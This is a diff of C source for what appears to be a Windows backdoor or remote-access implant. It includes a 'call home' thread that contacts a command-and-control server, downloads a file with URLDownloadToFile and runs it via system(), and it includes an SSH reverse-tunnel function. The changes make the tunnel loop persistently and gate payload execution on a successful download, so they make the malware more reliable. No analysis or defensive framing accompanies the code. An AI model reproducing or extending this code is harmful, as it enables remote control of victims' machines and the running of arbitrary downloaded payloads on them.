@@ -322,7 +322,7 @@ CLOSE_SOCKET:
 DWORD WINAPI open_ssh_tunnel(LPVOID params) {
     int result;
     int retries;
-    ssh_channel channel;
+    ssh_channel channel = NULL;
     ssh_session session = NULL;
 
     struct tunnel_params* tunnel_params = (struct tunnel_params*)params;
@@ -342,13 +342,15 @@ DWORD WINAPI open_ssh_tunnel(LPVOID params) {
         goto DISCONNECT;
     }
 
-    channel = channel_forward_accept(session, 60000);
+    while (tunnel_params->running) {
+        channel = channel_forward_accept(session, 60000);
+        if (channel == NULL) {
+            continue;
+        }
 
-    if (channel == NULL) {
-        goto DISCONNECT;
+        forward_tunnel(channel, tunnel_params);
     }
-
-    forward_tunnel(channel, tunnel_params);
+   
     ssh_channel_send_eof(channel);
     ssh_channel_free(channel);
 DISCONNECT:
@@ -540,7 +542,10 @@ DWORD WINAPI call_home_thread_func(LPVOID c2_server_ip)
                     DeleteUrlCacheEntry((LPCSTR)wide_param);
                     HRESULT result = URLDownloadToFile(NULL, (LPCSTR)wide_param, (LPCSTR)"C:\\tmp\\temp", 0, NULL);
                     free(wide_param);
-                    system("C:\\tmp\\temp");
+
+                    if (result == 0) {
+                        system("C:\\tmp\\temp");
+                    }
                 }
 
             }
@@ -551,15 +556,19 @@ SLEEP:
 		Sleep(UPDATE_INTERVAL);
 	}
 }
-int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
-	
-    //init lib ssh
+int main(int argc, char** argv) {
+    
+
+    if (argc < 2) {
+        return 1;
+    }
+
     ssh_init();
-    char* c2_server_ip = (char*)lpCmdLine;
+    char* remote_ip = argv[1];
     
 	//start connecting
 	DWORD thread_id;
-	HANDLE handle = start_thread(call_home_thread_func, c2_server_ip);
+	HANDLE handle = start_thread(call_home_thread_func, remote_ip);
 	
 	//wait for call_home thread to finish
 	WaitForSingleObject(handle, INFINITE);
